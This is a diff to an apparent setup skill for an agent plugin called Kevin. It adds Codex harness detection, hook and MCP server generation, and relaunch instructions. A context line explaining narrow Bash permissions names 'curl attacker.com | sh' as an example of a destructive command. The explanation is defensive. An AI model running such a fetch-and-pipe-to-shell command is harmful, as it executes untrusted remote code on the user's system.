@@ -78,6 +78,10 @@ echo "KEVIN_OS=$KEVIN_OS"
 
 Carry `$KEVIN_OS` and `$PLATFORM_LABEL` through the rest of the walk.
 
+**Detect the harness.** Kevin runs under Claude Code or OpenAI Codex, and a few later steps differ by host. Codex wraps this skill's text in a `<skill>` block with a `<path>`, invokes skills as `$name`, and delivers Kevin's identity stack as sliced `developer` messages whose first line reads `<!-- kevin static context · slice 1/N · harness: codex …`; Claude Code prefixes the skill with `Base directory for this skill:` and loads the stack through the `.claude/CLAUDE.md` `@-imports`. Set `KEVIN_HARNESS` to `codex` or `claude` and carry it through the walk.
+
+**Resolve the plugin checkout.** `$PLUGIN_ROOT` is the directory this skill loaded from: two levels above the skill's base directory (the `Base directory for this skill:` line under Claude Code, the `<skill>` block's `<path>` under Codex). Under Claude Code that is the same path as `${CLAUDE_PLUGIN_ROOT}`; wherever a later step says `${CLAUDE_PLUGIN_ROOT}`, use `$PLUGIN_ROOT`.
+
 **Check prerequisites — bail early if a show-stopper is missing.** Kevin's MCP server, all three hooks, and the CLI launch via `bun`, so it's a hard requirement; `git` backs the version-controlled knowledge tree, the session git-activity context, and worktrees. `python3` is **optional but recommended** — Kevin is TypeScript-first, but some tooling and integrations still reach for Python, so having it on PATH avoids friction later. On macOS both `git` and `python3` come with the Xcode Command Line Tools (`xcode-select --install`); neither needs Homebrew. `gh` is **conditional**: nothing else uses it, but every GitHub-pack tool shells out to it — including `github_fast_forward`, which is what keeps the code checkouts current during `/agent-kevin:sync`. It is not bundled with Claude Code or this plugin, so on macOS it means Homebrew (`brew install gh`). Probing it here turns a mid-session throw into a note the operator can act on before they tick the pack. `poppler` is **optional** as well: the Read tool renders PDF pages through its `pdftoppm` binary, so install it (macOS `brew install poppler`, Linux `poppler-utils`) if you want Kevin to read PDF files. On **native Windows**, Kevin runs through **Git Bash** (the shell Claude Code uses for its Bash tool) — that's the supported Windows path and supplies the POSIX environment Kevin's commands assume; **WSL2** also works if you prefer a full Linux userland.
 
 ```bash
@@ -1126,7 +1130,7 @@ The allow list also carries fifteen **skill** grants. Skills register regardless
 
 **Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).
 
-Do **not** add a `hooks` block here. Hooks come from the plugin's own `hooks/hooks.json` once the plugin is registered. Sandbox lands only via the user-global gap-fill above (never authored fresh in the scaffold when global already enables it). API keys + external MCP server config land in `settings.local.json` and `<HOME>/.mcp.json` later via `/agent-kevin:configure-skills` — those files stay separate.
+Do **not** add a `hooks` block here. Hooks come from the plugin's own `hooks/claude.json` (declared in its manifest) once the plugin is registered. Sandbox lands only via the user-global gap-fill above (never authored fresh in the scaffold when global already enables it). API keys + external MCP server config land in `settings.local.json` and `<HOME>/.mcp.json` later via `/agent-kevin:configure-skills` — those files stay separate.
 
 USER.md template:
 
@@ -1423,6 +1427,18 @@ Idempotent by file, same as the concept seeding above: an existing rule file is 
 
 ---
 
+## Step 7c — Codex wiring (when the harness is Codex, or the operator also runs Codex here)
+
+Codex reads `AGENTS.md` natively but has no `@-import`, and as of Codex 0.153 a plugin can bundle neither hooks nor an MCP server that knows which home it serves (the server is launched inside the plugin cache, and Codex exports no workspace variable and advertises no MCP roots). So under Codex both live per home: hooks in `$HOME_DIR/.codex/hooks.json` and the `kevin` MCP server in `$HOME_DIR/.codex/config.toml`, each pinned to this plugin checkout and this home. Generate them; never hand-write either file:
+
+```bash
+bun "$PLUGIN_ROOT/skills/init/scripts/codex-setup.ts" --home "$HOME_DIR" --write
+```
+
+If the operator once registered Kevin's server globally (`codex mcp add kevin …`), remove that copy with `codex mcp remove kevin` so the per-home registration is the only `kevin`. It prints `{ hooks: { path, changed }, mcp: { path, changed }, entries }`: twelve `SessionStart` entries each deliver one slice of the static context (entries past the stack print nothing, so the count only bounds growth), one `SessionEnd` entry captures the session, and the `[mcp_servers.kevin]` table launches the server with `AGENT_HOME` set. Other hooks, other MCP servers, and other settings in those files are preserved. Skip this step when `KEVIN_HARNESS=claude` unless the operator says they also launch `codex` from this home; ask once if unsure.
+
+**Trust is the operator's step.** Codex reads a project's `.codex/config.toml` only for a trusted folder (it asks on first launch), and trusts hooks per command by content hash: an untrusted hook does not run at all (silently, under `codex exec`). Note for Step 9: the operator must trust the folder, then run `/hooks` in their next Codex session from this home and trust all 13 entries, or Codex sessions start without Kevin's context and are never captured.
+
 ## Step 8 — Optional: configure skill packs
 
 The scaffold is done. Before showing the final confirmation, offer to wire up API keys + MCP servers + permissions for the optional packs. This is exactly what `/agent-kevin:configure-skills` does — invoking inline so the user doesn't have to run it as a separate command after relaunch.
@@ -1473,12 +1489,15 @@ Blank line, then the status block as plain prose (one row per line, two-space gu
 > ✅ Identity      SOUL.md · IDENTITY.md · USER.md
 > ✅ Operating manual   `<MANUAL_PATH>` (+ `.claude/CLAUDE.md`, the Claude Code bridge that `@-imports` it and the above)
 > ✅ Plugin reg    .claude/settings.json (auto-loads agent-kevin next launch — no `--plugin-dir` needed)
+> `<CODEX_HOOKS_ROW>`
 > ✅ Knowledge     `<FACET_FILES_FILLED>/5` facets populated `<from blog · LinkedIn · GitHub, if Step 5 ran>`
 > ✅ Indexes       knowledge/index.md · knowledge/memory/index.md · projects/TASKS.md
 > ✅ Dashboard     dashboard.html — open it in any browser; rebuilt by every sync or `/agent-kevin:dashboard`
 > ✅ Concepts      4 seeded: karpathy-wiki · markdown-native-task-management · self-evolution-loop · audit-premise-decay
 > `<SKILL_PACK_ROW>`
 > ⏳ Custom skills none — author with `/agent-kevin:configure-skills`
+
+For `<CODEX_HOOKS_ROW>`: if Step 7c ran → `✅ Codex wiring  .codex/hooks.json (13 entries; trust them via /hooks) + .codex/config.toml (kevin MCP server)`; otherwise omit the row.
 
 For `<SKILL_PACK_ROW>`, render the row based on what Step 8 did. Note: "activated" here means permissions granted + `.kevin/secrets/.env` ensured (and the `GSC_SITE_URL` placeholder planted), not key values — those come from the user editing `.kevin/secrets/.env` (secrets) and `settings.local.json` (`GSC_SITE_URL`).
 - If user skipped Step 8 entirely → `⏳ Skill packs   none activated — run /agent-kevin:configure-skills later`
@@ -1532,6 +1551,8 @@ Blank line, then the **Next** heading (same style as Ready), then the relaunch p
 > cd <HOME_DIR>
 > claude
 > ```
+>
+> **Running Codex from this home?** Relaunch with `codex` instead, trust the folder when asked (that is what lets Codex read the home's `.codex/config.toml`, where Kevin's MCP server is registered), run `/hooks`, and trust the 13 Kevin entries (`session-start` ×12, `session-end` ×1). Until then, Codex starts without Kevin's context and captures nothing. Skills are invoked with `$name` there (`$quick-pulse`, `$sync`); the plugin itself installs with `codex plugin marketplace add <PLUGIN_DIR>` then `codex plugin add agent-kevin@agentdev-kevin`.
 >
 > **Watch for a marketplace trust prompt.** On first relaunch, Claude Code asks "this project wants to register a marketplace and enable a plugin — trust it?" **Accept it.** If you dismiss/miss the prompt, the plugin won't load and the SessionStart banner won't appear — recover by running:
 >
